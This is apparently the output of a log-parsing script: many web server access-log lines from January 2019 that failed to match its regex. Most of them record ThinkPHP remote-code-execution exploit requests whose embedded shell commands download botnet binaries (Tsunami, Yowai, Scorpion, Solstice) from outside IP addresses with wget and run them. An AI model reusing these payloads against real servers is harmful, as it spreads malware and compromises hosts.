%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[52655,%2052656,%2052657,%2052658,%2052659,%2052660,%2052661,%2052662,%2052663,%2052665]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[544830,%20546600,%20550351,%20553443,%20560398,%20562693,%20562711,%20563201,%20563612,%20596195,%20616862,%20619229,%20658829,%20710492,%20711098,%20828002,%20992279,%201035525,%201049985,%201077057,%201093845,%201120584,%201133461,%201167502,%201199142,%201243639,%201252993,%201260212,%201268963,%201271146,%201275637,%201285275,%201290628,%201302637,%201314616,%201325630,%201338198,%201353457,%201377565,%201384634,%201397936,%201399349,%201405002,%201419008,%201431512,%201446966,%201475130,%201490551,%201521345,%201539907,%201616908,%201629906,%201665472,%201731786,%201754922,%20544831,%20546601,%20550352,%20553444,%20560399,%20562695,%20562713,%20563202,%20563613,%20596196,%20616863,%20619230,%20658830,%20710493,%20711099,%20828003,%20992280,%201035526,%201049986,%201077058,%201093846,%201120585,%201133462,%201167503,%201199143,%201243640,%201252994,%201260213,%201268964,%201271147,%201275638,%201285276,%201290629,%201302638,%201314617,%201325631,%201338199,%201353458,%201377567,%201384636,%201397938,%201399351,%201405004,%201419010,%201431514,%201446968,%201475132,%201490553,%201521347,%201539909,%201616910,%201629908,%201665474,%201731788,%201754924,%20544832,%20546602,%20550353,%20553445,%20560400,%20562697,%20562715,%20563203,%20563614,%20596197,%20616864,%20619231,%20658831,%20710494,%20711100,%20828004,%20992281,%201035527,%201049987,%201077059,%201093847,%201120586,%201133463,%201167504,%201199144,%201243641,%201252995,%201260214,%201268965,%201271148,%201275639,%201285277,%201290630,%201302639,%201314618,%201325632,%201338200,%201353459,%201377569,%201384638,%201397940,%201399353,%201405006,%201419012,%201431516,%201446970,%201475134,%201490555,%201521349,%201539911,%201616912,%201629910,%201665476,%201731790,%201754926,%20544833,%20546603,%20550354,%20553446,%20560401,%20562699,%20562717,%20563204,%20563615,%20596198,%20619232,%20658832,%20710495,%20711101,%20828005,%20992282,%201035528,%201049988,%201077060,%201093848,%201120587,%201133464,%201167505,%201199145,%201243642,%201252996,%201260215,%201268966,%201271149,%201275640,%201285278,%201290631,%201302640,%201314619,%201325633,%201338201,%201353460,%201377571,%201384640,%201397942,%201399355,%201405008,%201419014,%201431518,%201446972,%201475136,%201490557,%201521351,%201539913,%201616914,%201629912,%201665478,%201731792,%201754928,%20544834,%20546604,%20550355,%20553447,%20560402,%20562701,%20562719,%20563205,%20563616,%20596199,%20616865,%20619233,%20658833,%20710496,%20711102,%20828006,%20992283,%201035529,%201049994,%201077061,%201093849,%201120588,%201133465,%201167506,%201199146,%201243643,%201252997,%201260216,%201268967,%201271150,%201275641,%201285279,%201290632,%201302641,%201314620,%201325634,%201338202,%201353461,%201377573,%201384642,%201397944,%201399357,%201405010,%201419016,%201431520,%201446974,%201475138,%201490559,%201521353,%201539915,%201616916,%201629914,%201665480,%201731794,%201754930,%20544835,%20546605,%20550356,%20553448,%20560403,%20562703,%20562721,%20563206,%20563617,%20596200,%20616866,%20619234,%20658834,%20710497,%20711103,%20828007,%20992284,%201035530,%201049993,%201077062,%201093850,%201120589,%201133466,%201167507,%201199147,%201243644,%201252998,%201260217,%201268968,%201271151,%201275642,%201285280,%201290633,%201302642,%201314621,%201325635,%201338203,%201353462,%201377575,%201384644,%201397946,%201399359,%201405012,%201419018,%201431522,%201446976,%201475140,%201490561,%201521355,%201539917,%201616918,%201629916,%201665482,%201731796,%201754932,%20544836,%20546606,%20550357,%20553449,%20560404,%20562704,%20562723,%20563207,%20563618,%20596201,%20616867,%20619235,%20658835,%20710498,%20711104,%20828008,%20992285,%201035531,%201049992,%201077063,%201093851,%201120590,%201133467,%201167508,%201199148,%201243645,%201252999,%201260218,%201268969,%201271152,%201275643,%201285281,%201290634,%201302643,%201314622,%201325636,%201338204,%201353463,%201377577,%201384646,%201397948,%201399361,%201405014,%201419020,%201431524,%201446978,%201475142,%201490563,%201521357,%201539919,%201616920,%201629918,%201665484,%201731798,%201754934,%20544837,%20546607,%20550358,%20553450,%20560405,%20562706,%20562724,%20563208,%20563619,%20596202,%20616868,%20619236,%20658836,%20710499,%20711105,%20828009,%20992286,%201035532,%201049991,%201077064,%201093852,%201120591,%201133468,%201167509,%201199149,%201243646,%201253000,%201260219,%201268970,%201271153,%201275644,%201285282,%201290635,%201302644,%201314623,%201325637,%201338205,%201353464,%201377579,%201384648,%201397950,%201399363,%201405016,%201419022,%201431526,%201446980,%201475144,%201490565,%201521359,%201539921,%201616922,%201629920,%201665486,%201731800,%201754936,%20544838,%20546608,%20550359,%20553451,%20560406,%20562708,%20562726,%20563209,%20563620,%20596203,%20616869,%20619237,%20658837,%20710500,%20711106,%20828010,%20992287,%201035533,%201049990,%201077065,%201093853,%201120592,%201133469,%201167510,%201199150,%201243647,%201253001,%201260220,%201268971,%201271154,%201275645,%201285283,%201290636,%201302645,%201314624,%201325638,%201338206,%201353465,%201377581,%201384650,%201397952,%201399365,%201405018,%201419024,%201431528,%201446982,%201475146,%201490567,%201521361,%201539923,%201616924,%201629922,%201665488,%201731802,%201754938,%20544839,%20546609,%20550360,%20553452,%20560407,%20562710,%20562728,%20563210,%20563621,%20596204,%20616870,%\" 414 186 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 193.250.60.181 - - [23/Jan/2019:15:48:22 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 219.145.246.35 - - [23/Jan/2019:16:11:50 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 37.29.35.152 - - [23/Jan/2019:16:46:40 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 112.137.114.117 - - [23/Jan/2019:17:03:43 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 124.140.76.80 - - [23/Jan/2019:17:04:32 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 221.125.253.128 - - [23/Jan/2019:17:30:18 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 42.118.227.227 - - [23/Jan/2019:18:01:22 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 122.196.231.141 - - [23/Jan/2019:18:12:30 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 66.160.178.90 - - [23/Jan/2019:19:06:38 +0330] \"w\\x12\\xC4\\xD1\\x83\\x07\\x84\\x14dJ4\\x8D\\xDBym\\xADY\\xD3\\x85\\x13\\xB1tx\\xFD\\xC4\\x0F=\\xBD'xA\\x91b\\x8A\\xAB\\x12\\xC1lta\\x7Ft%\\xB9\\xC8\\xDF\\xCA\\xA7\\xEE\\x80\\xFE\\x0Cc\\x0F\\x8Ey!\\x9F\\x09\\xC9\\x1A\\x92\\xD1\\xDF\\xDC\\xE8>\\x16wf'\\xA6\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 49.241.214.70 - - [23/Jan/2019:19:07:13 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 31.162.242.70 - - [23/Jan/2019:19:07:48 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 178.46.9.201 - - [23/Jan/2019:19:17:14 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 99.100.6.45 - - [23/Jan/2019:19:24:13 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 117.192.231.96 - - [23/Jan/2019:19:31:11 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 41.235.182.3 - - [23/Jan/2019:20:15:15 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 41.235.182.3 - - [23/Jan/2019:20:15:16 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 121.84.86.234 - - [23/Jan/2019:20:22:42 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 116.65.89.179 - - [23/Jan/2019:20:31:41 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 193.250.60.181 - - [23/Jan/2019:20:37:55 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 188.18.193.169 - - [23/Jan/2019:20:49:41 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 185.222.211.18 - - [23/Jan/2019:21:01:08 +0330] \"\\x03\\x00\\x00/*\\xE0\\x00\\x00\\x00\\x00\\x00Cookie: mstshash=Administr\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 94.50.236.10 - - [23/Jan/2019:21:25:58 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 89.46.222.181 - - [23/Jan/2019:21:26:22 +0330] \"GET public/index.php?s=/index/\\x5Cthink\\x5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://178.62.46.134/tom/Scorpion.x86;cat%20Scorpion.x86%20>%execute;chmod%20777%execute;./execute%20thinkphp\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 89.46.222.181 - - [23/Jan/2019:21:26:23 +0330] \"GET public/index.php?s=/index/\\x5Cthink\\x5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://178.62.46.134/tom/Scorpion.x86;cat%20Scorpion.x86%20>%execute;chmod%20777%execute;./execute%20thinkphp\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 72.52.125.79 - - [23/Jan/2019:21:31:31 +0330] \"nKB*=w\\xF4\\x0C\\xB5\\x189\\x9D\\xB0<K\\x9B\\xBA\\x82\\x0EP\\xFDp\\x060?\\xCA\\x93\\xA2\\xDF\\xA7D\\x06\\xED\\x1C\\x9Eb\\xC7G\\xCBYq\\x10\\x02\\xAC\\x1C\\xEE\\xDA1Ot\\xA5\\xF0b$\\x05\\xE1\\xFA\\xB7\\xA8\\xB9 5\\xBB0\\xD3}!\\xDD<\\x99\\xD7\\x1C\\xD5\\x04\\x03\\xF2\\x80)\\x99\\x80\\xD8\\x0B\\xF0\\x93\\x95\\x8D\\x0B\\xD2\\x06\\x9E\\xFC\\x19j\\xB3\\x8F\\x0B\\x99\\xDA\\x15\\xB2g\\xE07Z\\x9F\\x9E\\xE0\\x8B\\xD8\\x9CT_a\\xCA\\xDD\\xD4\\x13\\x9F\\xE1\\xDE\\x98\\xA1\\x88K>\\x7F\\x17!_.\\xDA\\xE4\\x0F\\x15+<7\\x03\\x04c#\\xF0\\xF3$\\x8ENa\\x09\\xC9\\x1F7B\\x12\\xE5\\xDF\\xDC\\xB64\\x1D\\xE7\\xBE\\xAD\\xDF8\\xFA\\x92\\xE7\\xE9\\x16\\xA3\\xA0\\xC9\\x98b\\x9B\\x07\\xFB\\x98G\\xD8\\x8D`\\x16\\xDDU\\xBE\\x8E\\x86\\xE9\\x96\\xE8\\xD6\\x1E\\xE2v\\x1C\\xF1\\x1Fy\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 94.23.156.20 - - [23/Jan/2019:21:37:36 +0330] \"\" 400 0 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 47.39.229.74 - - [23/Jan/2019:21:38:12 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 202.214.186.65 - - [23/Jan/2019:21:45:24 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 85.105.7.73 - - [23/Jan/2019:22:00:08 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 144.132.10.218 - - [23/Jan/2019:22:04:25 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 64.62.197.31 - - [23/Jan/2019:22:43:20 +0330] \"\\x00;\\x01\\x02\\x00\\x01\\x00\\x01\\xFC\\x03\\x03\\xC3/\\xFF\\x83\\xD4o\\x8EA\\xA2\\x91w\\xEC\\x94\\xFDV\\xF9\\xBCm\\xDDm\\xF5\\xD5\\x04\\x9D\\x94\\x9A\\xA4\\x8A\\x05]\\x0C\\xEF \\xCD\\xE1\\x92\\xBD\\x86J\\x92[\\x89\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 94.51.18.239 - - [23/Jan/2019:23:30:23 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 60.62.222.177 - - [23/Jan/2019:23:45:56 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 190.98.36.106 - - [23/Jan/2019:23:49:13 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 49.241.214.70 - - [23/Jan/2019:23:50:59 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 120.75.116.136 - - [24/Jan/2019:00:26:50 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 102.165.52.19 - - [24/Jan/2019:01:21:49 +0330] \"\\x16\\x03\\x01\\x00^\\x01\\x00\\x00Z\\x03\\x01\\x5CG\\xF4\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 102.165.52.19 - - [24/Jan/2019:01:21:49 +0330] \"\\x16\\x03\\x01\\x00^\\x01\\x00\\x00Z\\x03\\x01\\x5CG\\xF4\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 103.36.79.7 - - [24/Jan/2019:01:53:34 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 103.36.79.7 - - [24/Jan/2019:01:53:36 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 42.115.193.34 - - [24/Jan/2019:01:58:15 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 31.13.243.49 - - [24/Jan/2019:02:59:31 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 77.22.111.96 - - [24/Jan/2019:03:40:19 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 98.1.80.42 - - [24/Jan/2019:03:57:46 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 86.229.20.79 - - [24/Jan/2019:04:10:34 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 58.187.64.58 - - [24/Jan/2019:04:13:15 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 68.183.90.135 - - [24/Jan/2019:06:01:31 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://108.61.86.94/bins/Solstice.x86 -O /tmp/.Solstice; chmod 777 /tmp/.Solstice; /tmp/.Solstice Solstice.x86' HTTP/1.1\" 400 166 \"-\" \"Solstice/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 64.68.229.6 - - [24/Jan/2019:06:07:28 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 123.120.173.71 - - [24/Jan/2019:06:48:57 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 34.221.219.207 - - [24/Jan/2019:06:57:45 +0330] \"t3 9.2.0.0\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 221.202.76.248 - - [24/Jan/2019:06:57:48 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
